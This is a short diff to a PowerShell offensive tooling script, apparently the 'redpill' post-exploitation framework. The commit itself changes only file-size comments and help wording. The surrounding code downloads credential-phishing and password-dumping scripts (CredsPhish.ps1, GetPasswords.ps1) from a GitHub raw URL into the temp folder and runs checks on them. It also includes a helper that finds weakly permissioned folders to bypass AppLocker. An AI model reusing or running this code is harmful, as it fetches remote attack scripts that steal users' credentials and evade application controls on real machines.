@@ -1122,7 +1122,7 @@ If($PhishCreds -ieq "Start" -or $PhishCreds -ieq "Brute"){
 
    ## Check for file download integrity (fail/corrupted downloads)
    $CheckInt = Get-Content -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue
-   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,01953125/KB
+   $SizeDump = ((Get-Item -Path "$Env:TMP\CredsPhish.ps1" -EA SilentlyContinue).length/1KB) ## DefaultFileSize: 17,314453125/KB
    If(-not(Test-Path -Path "$Env:TMP\CredsPhish.ps1") -or $SizeDump -lt 17 -or $CheckInt -iMatch '^(<!DOCTYPE html)'){
       ## Fail to download CredsPhish.ps1 using BitsTransfer OR the downloaded file is corrupted
       Write-Host "[abort] fail to download CredsPhish.ps1 using BitsTransfer (BITS)" -ForeGroundColor Red -BackGroundColor Black
@@ -1186,7 +1186,7 @@ If($GetPasswords -ieq "Enum" -or $GetPasswords -ieq "Dump"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/GetPasswords.ps1 -Destination $Env:TMP\GetPasswords.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\GetPasswords.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 9){## Corrupted download detected => DefaultFileSize: 9,5205078125/KB
+      If($SizeDump -lt 9){## Corrupted download detected => DefaultFileSize: 9,6171875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\GetPasswords.ps1"){Remove-Item -Path "$Env:TMP\GetPasswords.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -1943,7 +1943,7 @@ if($AppLocker -ieq "Enum" -or $AppLocker -ieq "WhoAmi"){
       Helper - Enumerate directorys with weak permissions (bypass applocker)
 
    .Parameter AppLocker
-      Accepts: Enum and WhoAmi @arguments
+      Accepts arguments: Enum and WhoAmi
 
    .Parameter FolderRigths
       Accepts permissions: Modify, Write, FullControll
@@ -3171,7 +3171,7 @@ $HelpParameters = @"
       Helper - Enumerate directorys with weak permissions (bypass applocker)
 
    .Parameter AppLocker
-      Accepts: Enum and WhoAmi @arguments
+      Accepts arguments: Enum and WhoAmi
 
    .Parameter FolderRigths
       Accepts permissions: Modify, Write, FullControll
